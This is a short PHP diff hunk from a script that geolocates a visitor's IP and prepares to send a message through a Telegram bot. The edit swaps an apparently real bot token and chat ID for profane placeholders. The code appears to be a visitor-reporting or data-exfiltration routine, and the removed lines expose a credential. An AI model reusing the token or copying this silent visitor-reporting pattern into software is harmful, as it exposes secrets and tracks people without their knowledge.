@@ -14,8 +14,8 @@
     $NowCity = file_get_contents("https://ipapi.co/$ip/city/");
   
     // bot telegram
-    $token = "7758194328:AAG9pSD9fya02U2m4lgsG8OjNFKtLIt0r_0";
-    $chat_id = "-1002371075600";
+    $token = "F*CK u";
+    $chat_id = "-BTCH";
   
     // message
     $arr = array(
